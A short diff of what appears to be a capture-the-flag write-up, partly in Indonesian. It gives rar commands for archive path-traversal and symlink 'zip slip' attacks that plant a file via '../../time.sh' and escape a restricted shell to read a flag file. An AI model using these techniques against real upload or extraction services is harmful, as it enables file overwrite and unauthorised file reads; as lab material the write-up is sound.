@@ -23,7 +23,8 @@ $ rar rn evil.rar time.sh "../../time.sh"
 > get the location of the flag
 
 # step 2 -> keluar dari rbash, pake zipslip symlink
-
-$ rar a -ol more_evil.rar /etc/spartan
+$ touch /etc/spartan
+$ ln -s /etc/spartan symlink.txt
+$ rar a -ol more_evil.rar symlink.txt
 > upload
 > get the flag
